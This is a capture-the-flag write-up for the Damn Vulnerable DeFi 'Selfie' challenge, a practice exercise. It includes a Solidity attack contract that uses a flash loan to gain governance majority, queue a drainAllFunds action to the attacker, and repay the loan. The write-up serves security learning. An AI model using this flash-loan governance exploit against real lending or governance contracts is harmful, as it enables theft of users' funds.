## [Challenge #6 - Selfie](https://www.damnvulnerabledefi.xyz/challenges/6.html)

A new cool lending pool has launched! It's now offering flash loans of DVT tokens.

Wow, and it even includes a really fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.

### Solutions

#### Self

OK, I think I have this one figured out on my own. I need to borrow some tokens from the pool. As long as I have more than 50% of the total supply, I can do _governance things_. The thing I need to do with governance permissions, is queue an action. Then I can return my tokens back to the pool. With the tokens returned, the flash loan is satisfied. Then I can wait 2 days (or advance the chain by 2 days), and then execute the action. The action contained the code to `drainAllFunds()` of the pool into the attacker's wallet.   

### [cmichel.io](https://cmichel.io/damn-vulnerable-de-fi-solutions/)

This challenge is similar to the previous one. A governance contract accepting majority token holder decisions can be abused by taking a flash loan. We deposit the flash loan making our attacker a governance token whale which we can use to queue a governance action to drain all funds.

```solidity
function attack() public {
    uint256 flashLoanBalance = token.balanceOf(address(pool));
    attackerEOA = msg.sender;

    // get flash loan
    pool.flashLoan(flashLoanBalance);
}

// called by ISelfiePool::flashLoan
function receiveTokens(
    address, /* tokenAddress */
    uint256 amount
) external {
    // received tokens => take a snapshot because it's checked in queueAction
    token.snapshot();

    // we can now queue a government action to drain all funds to attacker account
    // because it checks the balance of governance tokens (which is the same token as the pool token)
    bytes memory drainAllFundsPayload =
        abi.encodeWithSignature("drainAllFunds(address)", attackerEOA);
    // store actionId so we can later execute it
    actionId = governance.queueAction(
        address(pool),
        drainAllFundsPayload,
        0
    );

    // pay back to flash loan sender
    token.transfer(address(pool), amount);
}
```